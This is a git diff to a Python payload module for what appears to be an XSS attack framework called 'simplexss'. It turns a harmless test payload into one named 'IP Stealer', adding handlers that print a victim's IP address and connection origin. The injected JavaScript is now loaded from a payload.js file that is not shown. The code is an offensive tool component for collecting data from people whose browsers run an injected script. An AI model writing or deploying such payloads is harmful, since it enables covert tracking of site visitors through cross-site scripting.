@@ -1,7 +1,8 @@
 from simplexss.api import (
     BasePayload,
     BaseClient,
-    BaseEvent
+    BaseEvent,
+    render
 )
 
 
@@ -11,19 +12,16 @@ class Payload(BasePayload):
     NAME = 'IP Stealer'
     VERSION = '0.0.1'
 
-    async def on_test(self, client: BaseClient, event: BaseEvent):
-        await self.io.print('Works!', color='green')
-        message = await self.io.input('Message', color='red')
-        return {
-            'name': 'response',
-            'data': {
-                'message': message
-            }
-        }
+    async def on_ip(self, client: BaseClient, event: BaseEvent):
+        await self.io.print(f'IP: {event.data.get("ip", "unknown")}')
+
+    async def on_connection(self, client: BaseClient, event: BaseEvent):
+        await self.io.print(f'Connection established: {client.origin}')
 
     def bind_endpoints(self):
-        self.transport.bind_endpoint('test', self.on_test)
+        self.transport.bind_endpoint('connection', self.on_connection)
+        self.transport.bind_endpoint('ip', self.on_ip)
 
     @property
     def payload(self) -> str:
-        return f'sendEvent("test"); addEventListener("response", (name, data) => {{alert(name)}})'
+        return render(self.directory, 'payload.js', )
